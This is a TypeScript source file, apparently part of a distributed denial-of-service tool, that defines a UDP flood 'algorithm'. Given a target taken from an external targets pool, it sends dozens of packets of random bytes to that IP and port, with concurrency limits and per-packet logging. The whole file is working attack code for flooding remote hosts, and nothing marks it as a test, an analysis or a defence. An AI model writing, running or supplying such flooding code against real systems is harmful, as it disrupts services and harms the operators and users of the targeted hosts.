import { createSocket } from 'dgram'
import { randomBytes } from 'crypto'

import { UDPFloodTarget } from '../external/targetsPool'
import { Algorithm, ExecutionResult, Config } from './algorithm'

import { sleep } from '../helpers'

export class UDPFlood extends Algorithm {
  protected MAX_CONCURRENT_WORKERS = 2
  protected SEND_DELAY = 10

  protected currentWorkers: number

  constructor (config: Config) {
    super(config)
    this.currentWorkers = 0
  }

  isValid (target: UDPFloodTarget): boolean {
    if (typeof target.ip !== 'string' || typeof target.port !== 'number') {
      return false
    }
    return true
  }

  async execute (target: UDPFloodTarget): Promise<ExecutionResult> {
    if (this.currentWorkers >= this.MAX_CONCURRENT_WORKERS) {
      await sleep(50)
      return { packetsSend: 1, packetsSuccess: 0, target, packetsNeutral: 1 }
    }

    this.currentWorkers += 1

    const client = createSocket({ type: 'udp4' })
    let packetsSend = 0
    let repeats = 48 + Math.floor(Math.random() * 32)

    while (repeats > 0) {
      repeats -= 1

      try {
        const request = new Promise<number>((resolve, reject) => {
          const rand = randomBytes(16 + Math.floor(Math.random() * 16))
          console.log(`${new Date().toISOString()} | UDP | ${target.ip} | ${target.port}`)
          client.send(rand, target.port, target.ip, (error, bytes) => {
            if (error === null) {
              resolve(bytes)
            } else {
              reject(error)
            }
          })
        })

        await request
        packetsSend += 1
        await sleep(this.SEND_DELAY)
      } catch (e) {
        console.error(e)
        break
      }
    }

    try {
      client.close()
    } catch (e) {
      console.error(e)
    }

    this.currentWorkers -= 1

    return { packetsSend, packetsSuccess: 0, target, packetsNeutral: packetsSend }
  }
}
